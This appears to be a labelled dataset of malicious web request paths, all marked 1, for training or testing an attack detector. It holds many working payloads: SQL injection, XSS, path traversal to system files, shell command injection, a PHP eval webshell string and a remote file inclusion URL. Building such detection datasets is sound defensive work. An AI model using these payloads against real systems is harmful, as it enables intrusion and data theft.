request	label
"/ iktok2bw . html ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ javascript / poi . exe 	1
/ manager / showproduct . php ? product = 1 ' 	1
/ javascript / ids . exe 	1
/ cacti / af . cgi ? _browser_out =  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  / etc / passwd 	1
/ examples / jsp / checkbox / admin / addentry . php ? phpbb_root_path =  / etc / passwd \ x00 	1
/ manager / index . php ? x = browse & category =  ' union select  ' 1 '  ,  ' 2 '  ,  ' pixelpost_category_sql_injection . nasl '  ,  ' 1331904458 '  ,  ' 5 '  -- 	1
/ scripts / yabb . pl ? board = news & action = display & num =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
"/ jnt3f86c . cfm ?  < script > document . cookie =  "" testcmax = 9270 ;  ""  <  / script > "	1
"/ ewc3rz1l . nsf ?  < meta http-equiv = set-cookie content =  "" testkgqo = 204 ""  > "	1
"/ string / strings / parameters = ""  echo rwfbcu $  (  ( 99 + 46 )  )  $  ( echo rwfbcu ) rwfbcu \  \ "	1
/ string / strings / parameters = 1 '  )  as lrif where 6525 = 6525 or row ( 1045 , 7562 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 1045 = 1045 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  -- 	1
/ string / strings / parameters = 1 '  )  as zmvn where 2887 = 2887 union all select null -- 	1
/ top . php ? stuff =  ; sleep \ x0910 \ x09 # 	1
/ string / strings / parameters = '  &  & echo $ ifsdstidd $  (  ( 87 + 89 )  )  $  ( echo $ ifsdstidd ) dstidd | 	1
"/ top . php ? stuff =  "" ver ;  > q63898211 & rem ; "	1
"/ string / strings / parameters = -3913 ""  ""  where 6085 = 6085 union all select 6085 , 6085 , 6085 , 6085 , 6085 , 6085 , 6085 # "	1
"/ string / modo = registro & login = alyosha & password = 91pol277e30 & nombre = emanuel & apellidos = barriuso + arvizu & email = ecoffey @ hostrofessional . com . dd & dni = 05207916a & direccion = ciudad + de + ceuta ,  + 31 ,  + 9-b & ciudad = saldaa & cp =  <  !  --  # exec + cmd =  "" ls +  /  ""  --  >  & provincia = cceres & ntc = 9078165703256769 & b1 = registrar "	1
/ apa_phpinclude . inc . php ? apa_module_basedir =  / etc / passwd \ x00 	1
"/ dslpwt15 . jsp ?  < meta http-equiv = set-cookie content =  "" testtkio = 5454 ""  > "	1
"/ string / strings / parameters = 1 ""  ""  or  ( select 9173 from ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 9173 = 9173 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from information_schema . character_sets group by x ) a ) "	1
"/ string / strings / parameters = 1 ""  ""  )  union all select null , null # "	1
/ string / modo = entrar & login = rahn & pwd = 28sca57 & remember = on /  & b1 = entrar 	1
"/ string / strings / parameters = <  / script >  < script > alert ( 1 )  +  "" "	1
"/ help . php ? q =  "" ping -w 7000 -n 1 4 . 3 . 2 . 1 & rem "	1
/ javascript / htpasswd . tar . gz 	1
"/ string / strings / parameters = < svg onload svg onload =  "" javascript : javascript : alert ( 1 )  ""  >  <  / svg onload > "	1
/ cgi-bin / phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331908691 & lang_crm =  .  .  /  .  .  / vtigerservice . php \ x00 	1
/ o6ebbirj . idc ?  < script > cross_site_scripting . nasl <  / script > 	1
/ examples / jsp / colors / php . cgi ?  / etc / passwd 	1
/ string / modo = insertar & precio =   & b1 = confirmar 	1
/ string / strings / parameters = 1 '  )  as kqbh where 6138 = 6138 ; call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  -- 	1
"/ string / strings / parameters = 1 %  ""  ""  )  )  )  ; select  ( case when  ( 5290 = 1720 )  then 5290 else 1 /  ( select 0 )  end )  -- "	1
/ string / modo = entrar & login = dovel & pwd = theresa & remember = offany ?  set-cookie :  + tamper = 5765205567234876235 & b1 = entrar 	1
"/ eg2u8pbv . fts ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
"/ main . php ? stuff =  ""  \ x0arm q72652917  # "	1
/ examples / jsp / sessions / config . php ? path [ docroot ]  =  / etc / passwd \ x00 	1
"/ j4drbkil . pl ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = -1 < script > a =  / crosssitescripting /  document . cookie = true ;  <  / script > 	1
/ string / strings / parameters = '   str =  $  ( echo paacld )   str1 =  $  {  # str }   if  [  2 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  ' 	1
"/ main . php ? logout =  "" del \ x09q46762746 \ x09 # "	1
/ javascript / document . manifest 	1
"/ top . php ? stuff =  ""  & rm q85227619 & rem "	1
/ common . php ? livealbum_dir = xxpathxx ? 	1
"/ string / str =  $  ( echo jmudmj )   str1 =  $  {  # str }   if  [  1 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "" "	1
/ string / strings / parameters = ;  str =  $  ( echo pohuxh )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  # 	1
/ string / strings / parameters = and 1 in  ( select var from temp )  -- 	1
"/ string / strings / parameters = ""  )  )  ; waitfor delay  ' 0 : 0 : __time__ '  -- "	1
"/ string / strings / parameters = < a href =  "" data : application / x-x509-user-cert ; base64 , phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg =  =  ""  > click <  / a > "	1
/ examples / jsp / error / admin / admin . php ? sid =  ' 	1
/ string / strings / parameters = 1 )  )  and  ( select  *  from  ( select ( sleep ( 5 )  )  ) fzno )  and  (  ( 5171 = 5171 	1
/ string / strings / parameters = 1 '  +  ( select  ' cwta '  where 6091 = 6091 ; select dbms_pipe . receive_message ( chr ( 66 )  |  | chr ( 67 )  |  | chr ( 79 )  |  | chr ( 101 )  , 5 )  from dual )  +  ' 	1
/ javascript / document . cgi 	1
/ examples / jsp / num / cart32 . exe 	1
"/ session / login . php ? dest = nessus ""  >  < script > alert (  ' ossim_dest_xss . nasl '  )  <  / script >  <  !  -- "	1
/ string / strings / parameters = 1 '  or 9643 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 ) 	1
/ string / strings / parameters = -9893 '  or 4747 = dbms_utility . sqlid_to_sqlhash (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  and  ' pbop '  =  ' pbop 	1
"/ vhzmaia2 . php3 ?  < meta http-equiv = set-cookie content =  "" testkogj = 3979 ""  > "	1
/ string / strings / parameters = -1244 )  as qszw where 2332 = 2332 union all select 2332 , 2332 , 2332 , 2332 # 	1
"/ xfkun1ku . mscgi ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ p043snfr . do ?  < script > cross_site_scripting . nasl <  / script > 	1
/ cgi-bin / post32 . exe | dir c :  \  \ 	1
/ string / strings / parameters = 1 '  +  ( select hsef where 4136 = 4136 or 8421 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  )  +  ' 	1
/ string / modo = entrar & login = foulke + s & pwd = 2esu1ador3 & remember = on & b1 = entrar 	1
/ string / strings / parameters = echo anstbn $  (  ( 20 + 35 )  )  $  ( echo anstbn ) anstbn \  \ 	1
/ forum_arc . asp ? n =  / etc / passwd | 36 | 80040e14 |  [ microsoft ]  [ odbc_sql_server_driver ]  [ sql_server ] line_1 : _incorrect_syntax_near_ &  # 039 ;  /  &  # 039 ;  . 	1
"/ azcrfs8d . dll ?  < meta http-equiv = set-cookie content =  "" testjpdr = 9205 ""  > "	1
"/ string / strings / parameters = ""  |   [  7 -ne  $  ( echo bilmti  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  / "	1
"/ string / strings / parameters = ""   str =  $  ( echo tnofgn )   str1 =  $  {  # str }   if  [  6 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi "	1
/ console / faces / com_sun_web_ui / help / masthead . jsp ? windowtitle =  <  / title >  < script > alert (  ' sun_java_web_console_helpwindow_xss . nasl '  )  <  / script > 	1
/ string / strings / parameters = '  group by 99999 	1
/ string / modo =  '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & precio = 4762 & b1 = confirmar 	1
"/ javascript /  . htaccess /  \  \  '  \  \  "" "	1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo fokdal )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  \  \ 	1
/ string / strings / parameters = &  & echo xtykfu $  (  ( 13 + 92 )  )  $  ( echo xtykfu ) xtykfu | 	1
/ string / modo = insertar & precio = 4011 & b1 = confirmar / 	1
/ functions / prepend_adm . php ? sets [ path ]  [ physical ]  = xxpathxx ? 	1
"/ jujgxwav . aspx ?  < meta http-equiv = set-cookie content =  "" testknim = 9383 ""  > "	1
/ assets / plugins / mp3_id / mp3_id . php ? globals [ base ]  = xxpathxx ? cmd 	1
"/ string / strings / parameters = < input type =  "" text ""  value =  `  `  < div / onmouseover =  ' confirm ( 1 )  '  > x <  / div > "	1
"/ x7pclv4s . fts ?  < script > document . cookie =  "" testiulz = 3709 ;  ""  <  / script > "	1
"/ main . php ? logout =  ""  \ x0adel q92897682  # "	1
/ string / modo = registro |  & login = jakabffy & password = 33arr179 & nombre = vahidreza & apellidos = curell + lagares & email = moura @ chicasdiabolo . iq & dni = 75130756z & direccion = urbanizacion + montesion ,  + 3 +  & ciudad = molinaseca & cp = 45180 & provincia = teruel & ntc = 2571648203429012 & b1 = registrar 	1
/ string / strings / parameters = [ b ] 	1
/ 0qhcnefz . x ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = -7371 '  )  union all select 4531 , 4531 , 4531 # 	1
"/ j4rdyhw8 . asp ?  < meta http-equiv = set-cookie content =  "" testrluj = 1420 ""  > "	1
/ string / strings / parameters = < img src = x onerror = prompt ` 1 `  > 	1
/ examples / servlets / servlet / view_user . php ? list = 1 & letter =  & sort_by =  ' select 	1
"/ vmi8bb12 . php ?  < meta http-equiv = set-cookie content =  "" testlerc = 2575 ""  > "	1
/ rv98iwjp . php ?  < script > cross_site_scripting . nasl <  / script > 	1
/ recordings / webspirs . cgi ? sp . nextform =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ scripts / docbuilder / top . php 	1
/ string / strings / parameters = | echo dsgrdb $  (  ( 86 + 22 )  )  $  ( echo dsgrdb ) dsgrdb ' 	1
"/ string / strings / parameters = 1 ""  ""  )  )  as swwb where 4244 = 4244 ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  -- "	1
/ string / strings / parameters = )  , null , null , null , null , null , null , null , null )  waitfor delay  ' 0 : 0 : 20 '   /  * 	1
/ string / strings / parameters = 1 '  |  |  ( select  ' fzcu '  where 9252 = 9252 procedure analyse ( extractvalue ( 5840 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end )  )  , 0x717a767a71 )  )  , 1 )  )  |  |  ' 	1
/ javascript / document . tgz 	1
/ string / modo = registro & login = kumamoto & password = glo0al & nombrea = nelo & apellidos = marcenio & email = touliatos @ intercambiodeenlaces . hr & dni = 19782082n & direccion = c /  + andres + bello ,  + 92 ,  + 6c & ciudad = alamedilla & cp = 13670 & provincia = guadalajara & ntc = 2637234925036276 & b1 = registrar 	1
/ scripts / apps / pbcs . dll / misc ? url =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / boot . ini 	1
/ string / strings / parameters = 1 )  )  order by 1 -- 	1
/ string / strings / parameters = print (  ` echo osgugu `  .  ` echo  $  (  ( 64 + 8 )  )  `  .  ` echo osgugu `  .  ` echo osgugu `  )  ;  /  / osgugu 	1
/ cgi-bin / index . php ? search =  < script > alert (  ' cmsimple_search_xss . nasl '  )  ;  <  / script >  & function = search 	1
/ phpmyadmin / documentation . html ? phpmyadmin = csc3t31gos8q2h30o9cfk567d1lu5go1 \ x0acat  / etc / passwd 	1
"/ top . php ? stuff =  ""  ; del q25742723  # "	1
/ examples / jsp / cal / libraries / adodb / server . php ? sql =  ' adodb_sql_sql_injection . nasl 	1
/ string / modo = registro & login = lemar & password = 43lpe7de2o & nombre = bianca & apellidos = valor + agudo & email = vallarine7 @ 7horas . mo & dni = 90125861q & direccion = plaza + monasterio + de + la + oliva ,  + s / n ,  +  & ciudad = tembleque & cp =  '  + delete + from + users & provincia = navarra & ntc = 7119531551958366 & b1 = registrar 	1
/ string / strings / parameters = < img src = javascript : confirm ( document . location )  > 	1
/ cacti / search . cgi ?  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ windows \ win . ini 	1
"/ string / strings / parameters = < meta http-equiv = set-cookie content =  "" testlwwz = 718 ""  > "	1
/ string / strings / parameters = *  / alert ( 1 )  <  / script >  < script >  /  * 	1
/ string / id = 1 & nombre = vino +  .  *  ? rioja & precio = 85 & cantidad = 42 & b1 = aadir + al + carrito 	1
"/ en-us / 33y9gcqq . cfc ?  < meta http-equiv = set-cookie content =  "" testnvxc = 4301 ""  > "	1
/ string / strings / parameters = 1 )  ,  ( version (  )  , 1 , 1 	1
/ javascript / profiling . exe 	1
/ javascript / jira . exe 	1
/ string / modo = registro & login = zureik & password = concurrente & nombre = lino & apellidos = u * rgell +  + cerarols & email = schulz @ hiperbarcelona . hn & dni = 64105812m & direccion = camoe ,  + 189 ,  +  & ciudad = olvs & cp = 03579 & provincia = guipzcoa & ntc = 6282081679981232 & b1 = registrar 	1
/ string / strings / parameters = 1 rlike  ( select  *  from  ( select ( sleep ( 5 )  )  ) sgvo )  #  ewsz 	1
/ string / strings / parameters = 1 )  )  as qzmg where 4344 = 4344 procedure analyse ( extractvalue ( 9255 , concat ( 0x5c ,  ( benchmark ( 5000000 , md5 ( 0x52515a50 )  )  )  )  )  , 1 )  -- 	1
/ string / strings / parameters = < a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href = j &  # 97v &  # 97script &  # x3a ;  &  # 97lert ( 1 )  > clickme 	1
/ string / b2 =  '  + and +  ' 1 '  =  ' 1 	1
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo eedngd )   &  &  str1 =  $  {  # str }   &  &   [  3 -eq  $  { str1 }   ]   &  &  sleep 1  \  \ 	1
/ cgi-bin / starnet / addons / slideshow_full . php ? album_name =  ' 2022599802 	1
"/ bxnyrhmh . idc ?  < script > document . cookie =  "" testmjct = 1867 ;  ""  <  / script > "	1
/ string / str =  $  ( echo ecbrpq )   str1 =  $  {  # str }   if  [  6 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  /  / 	1
/ mssql . exe 	1
"/ moodle / filter / tex / texed . php ? formdata = foo & pathname = foo ""  +  |  |  + echo + db + 4d + 5a + 50 + 00 + 02 + 00 + 00 + 00 + 04 + 00 + 0f + 00 + ff + ff + 00 + 00 + b8 + 00 + 00 + 00 + 00 + 00 + 00 + 00 + 40 +  +  >  > esbq "	1
"/ examples / jsp / error / session / login . php ? dest = nessus ""  >  < script > alert (  ' ossim_dest_xss . nasl '  )  <  / script >  <  !  -- "	1
/ javascript / input . exe 	1
/ javascript / configs . exe 	1
/ string / strings / parameters = 1 )  as qeav where 8127 = 8127 and 4241 = convert ( int ,  ( select char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  -- 	1
/ string / modo = insertar & precio = 9085bob @  < script > alert ( paros )  <  / script >  . parosproxy . org & b1 = pasar + por + caja 	1
"/ p043snfr . aspx ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
"/ main . php ? logout =  "" rm q68212743  # "	1
"/ en-us / dda2qr7j . aspx ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ index . php ? language = xxpathxx ? 	1
/ string / str =  $  ( echo ycsciw )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  /  / 	1
"/ gy23xnjq . do ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = xx : xx onerror = alert ( 1 )  /  /  --  !  > 	1
/ string / modo = registro & login = dunlap & password = d5s3748da & nombre = walerico & apellidos = bartra + berguo & email = luca8 @ mobilecrm . iq & dni = 41944054n & direcciona = plaa + don + ramon + serrano + suer ,  + s / n +  & ciudad = antigedad & cp = 09610 & provincia = madrid & ntc = 2664915448366606 & b1 = registrar 	1
/ string / strings / parameters = echo mesjof $  (  ( 62 + 27 )  )  $  ( echo mesjof ) mesjof /  / 	1
"/ string / strings / parameters = -5998 %  ""  ""  )  union all select 2366 , 2366 , 2366 , 2366 # "	1
/ string / id = 3 /  & nombre = jamn + ibrico & precio = 85 & cantidad = 7 & b1 = aadir + al + carrito 	1
"/ main . php ? stuff =  ""  | ping \ x0c-w \ x0c10000 \ x0c-n \ x0c1 \ x0c1 . 2 . 3 . 4 | rem \ x0c "	1
/ modules / filters / headerfile . php ? system [ path ]  = xxpathxx 	1
/ string / strings / parameters = < body / onpageshow = alert ( 1 )  > 	1
/ scripts / index . php ? option = weblinks & itemid = 2 & catid = -1 union select 0 , 1 , 2 , 522571337321 , 4 , 5 , 6 , 7 , 8 , 9 , 10 , 11 -- 	1
/ string / strings / parameters = 1 '  )  )  union all select null , null , null , null , null # 	1
/ string / strings / parameters = -9445 )  as dmur where 4371 = 4371 union all select 4371 , 4371 , 4371 , 4371 , 4371 , 4371 , 4371 , 4371 , 4371 , 4371 # 	1
/ phpmyadmin / bb_func_txt . php ? pathtofiles =  / etc / passwd \ x00 	1
/ string / strings / parameters = echo bkrxcq $  (  ( 95 + 40 )  )  $  ( echo bkrxcq ) bkrxcq & 	1
"/ string / strings / parameters = 1 ""  ""  and 8407 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  and  ""  "" eslo ""  ""  like  ""  "" eslo "	1
"/ zroo33l4 . mscgi ?  < script > document . cookie =  "" testiklc = 904 ;  ""  <  / script > "	1
"/ string / strings / parameters = < div style =  "" background : url ( test5 . svg )  ""  > press enter <  / div >  /  /  [  ""  '  `  --  >  ]  ]  >  ]  <  / div > "	1
/ cacti / includes / converter . inc . php ? include_path =  / etc / passwd \ x00 	1
/ string / id = 3 /  & nombre = queso + manchego & precio = 100 & cantidad = 46 & b1 = aadir + al + carrito 	1
"/ ywaxntrx . cfc ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = echo $ ifshsvhka $  (  ( 85 + 77 )  )  $  ( echo $ ifshsvhka ) hsvhka 	1
"/ azcrfs8d . do ?  < meta http-equiv = set-cookie content =  "" testjpdr = 9205 ""  > "	1
/ script / 	1
/ cgi-bin / admin / general . php ? mode = perlinfo & config [ general ]  [ perl_binary ]  = cat  / etc / passwd |  | 	1
"/ gy23xnjq . idc ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ port . php ? proto = tcp ' 	1
/ string / strings / parameters = $  { shell_exec ( print (  ` echo dpvesg echo  $  (  ( 76 + 66 )  )  echo dpvesg echo dpvesg `  )  ;  )  } dpvesg 	1
/ string / modo = registro & login = perez & password = interclusin & nombre = fabrina & apellidos = chomb + mantero & email = casini-fridley @ civicosdns . ws & dni = 34788445w & direccion = rotonda + palomera + centro + 4 ,  + 5 ? a & ciudad = seriny & cp = 32755 & provincia = madrid & ntc = 165911526940970 & b1 = registrar 	1
/ examples / jsp / jsp2 / el / mailbox . php3 ? actionid = 6 & server = x & imapuser = x '  ; somesql & pass = x 	1
/ forum . asp ? n =  / etc / passwd | 41 | 80040e14 |  [ microsoft ]  [ odbc_sql_server_driver ]  [ sql_server ] line_1 : _incorrect_syntax_near_ &  # 039 ;  /  &  # 039 ;  . 	1
/ cgi-bin / base_local_rules . php ? dir =  < script > alert (  ' base_local_rules_xss . nasl-1331904405 '  )  <  / script > 	1
"/ string / strings / parameters = 1 ""  ""  and 4386 = utl_inaddr . get_host_address ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  and  ""  "" buzb ""  ""  =  ""  "" buzb "	1
/ string / strings / parameters = 1 '  ; select  *  from generate_series ( 4592 , 4592 , case when  ( 4592 = 4592 )  then 1 else 0 end )  limit 1 -- 	1
"/ string / strings / parameters = 1 ""  ""  )  as oztl where 6655 = 6655 or 8315 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  -- "	1
"/ j4drbkil . cfc ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ ap58k3ci . cfm ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = 1 '  )  )  ; select  ( case when  ( 4660 = 4660 )  then 4660 else cast ( 1 as int )  /  ( select 0 from dual )  end )  from dual -- 	1
/ string / strings / parameters = 1 '  in boolean mode )  and elt ( 4249 = 4249 , 7259 )  # 	1
/ string / modo = registro & login = glancey & password = filolgicamente & nombre = yago & apellidos =  |  & email = kaminski @ lola-lutscht . cf & dni = 48258022c & direccion = chalets + de + la + tierruca ,  + 118 + 8-f & ciudad = valls & cp = 50691 & provincia = ciudad + real & ntc = 8042027288739194 & b1 = registrar 	1
"/ lmw4r201 . cfm ?  < script > document . cookie =  "" testwews = 8477 ;  ""  <  / script > "	1
/ string / strings / parameters = < isindex action = j a vas c r ipt : alert ( 1 )  type = image > 	1
/ string / strings / parameters = 1 %  '  )  procedure analyse ( extractvalue ( 5840 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end )  )  , 0x717a767a71 )  )  , 1 )  and  (  '  %  '  =  ' 	1
"/ string / strings / parameters = '  ""  >  *  /  --  >  <  / title >  <  / style >  <  / textarea >  <  / script  >  < img src = x onerror = confirm ( 1 )  > "	1
/ iktok2bw . pl ?  < script > cross_site_scripting . nasl <  / script > 	1
/ awzmb / modules / help . incl . php ? setting [ opt_includepath ]  = xxpathxx 	1
/ cgi-bin / gotopage . cgi ? 4242 +  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / strings / parameters = |   [  6 -ne  $  ( echo ajewoj  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  ' 	1
"/ apavxugx . php3 ?  < meta http-equiv = set-cookie content =  "" testdnbh = 5237 ""  > "	1
/ string / strings / parameters = ;  str =  $  ( echo gzpdpd )  ;  str1 =  $  {  # str }  ;  if  [  7 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi 	1
"/ 3m5knyc4 . fts ?  < script > document . cookie =  "" testbgqj = 6434 ;  ""  <  / script > "	1
/ string / id = 2 & nombre = jamn '  + ibric- ' o & precio = 100 & cantidad = 90 & b1 = aadir + al + carrito 	1
/ javascript / dropped . exe 	1
/ examples / jsp / num / admin / plog-admin-functions . php ? config [ basedir ]  =  / etc / passwd \ x00 	1
/ string / strings / parameters = echo pqvhoy $  (  ( 31 + 46 )  )  $  ( echo pqvhoy ) pqvhoy ' 	1
/ cgi-bin / mail . php ? id =  '  /  *  *  / union /  *  *  / select /  *  *  / 1 , 2 , 1331923205 , 4 --  & blog = 1 	1
/ cgi-914 / gw5 / gwweb . exe ? htmlver = aaa & get-context 	1
/ string / strings / parameters = ;  str =  $  ( echo msptmx )  ;  str1 =  $  {  # str }  ;  if  [  2 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi 	1
"/ string / strings / parameters = 1 %  ""  ""  )  )  and 6240 =  (  ' qqpjq '  |  |  ( select case 6240 when 6240 then 1 else 0 end from rdb $ database )  |  |  ' qzvzq '  )  and  (  (  ""  ""  %  ""  ""  =  ""  "" "	1
/ 0rufe52p . cgi ?  < script > cross_site_scripting . nasl <  / script > 	1
/ javascript / appl . exe 	1
/ string / modo = registro & login = christel & password =  ? t3a01bl1 & nombre = nador & apellidos = paredes & email = cancellieri @ enla . fr & dni = 39547146a & direccion = descanso ,  +  +  + 105 +  & ciudad = sant + ferriol & cp = 09680 & provincia = alicante & ntc = 3806763384332425 & b1 = registrar 	1
/ string / strings / parameters = echo uukzpi $  (  ( 71 + 35 )  )  $  ( echo uukzpi ) uukzpi /  / 	1
/ string / modo = insertar & precio = 4074 & b1 =  + 	1
/ string / strings / parameters = ;  str =  $  ( echo yczvoo )  ;  str1 =  $  {  # str }  ;  if  [  2 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  / 	1
/ phpmyadmin / mrtg . cgi ? cfg =  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / winnt / win . ini 	1
/ string / strings / parameters = '  |   [  2 -ne  $  ( echo xocduh  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \ 	1
/ string / strings / parameters = 1 '  )  )  ; select  ( case when  ( 6276 = 6276 )  then 6276 else 6276 *  ( select 6276 from information_schema . character_sets )  end )  # 	1
/ examples / servlets / servlet / calendar_admin . pl ? config =  | cat  / etc / passwd | 	1
/ index . php ? id = h6xj4vcok1 ' 	1
/ main . php <  ? eval (  $ _post [  ' q28117717 '  ]  )  ;  ? eval (  $ _post [  ' q28117717 '  ]  )  ;  ?  > 	1
/ string / strings / parameters = 1 '  )  )  )  and sleep ( 5 )  and  (  (  (  ' vbck '  like  ' vbck 	1
/ 7o5qp766 . htm ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / modo = entrar & login = hironaga & pwd = inst76men991 ' me1te & remember = on & b1 = entrar 	1
/  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  / etc / passwd 	1
/ scriptpath / index . php ? page = http :  /  / 192 . 168 . 202 . 118 : 8080 / iroy1gvqrrqu ? 	1
/ examples / jsp / cal / index . php ? search =  < script > alert (  ' cmsimple_search_xss . nasl '  )  ;  <  / script >  & function = search 	1
"/ string / strings / parameters = < script \ x2ftype =  "" text / javascript ""  > javascript : alert ( 1 )  ;  <  / script > "	1
"/ help . php ? q =  ""  \ x0dsleep \ x0910 \ x09 # "	1
"/  < meta http-equiv = set-cookie content =  "" testyglc = 8988 ""  > "	1
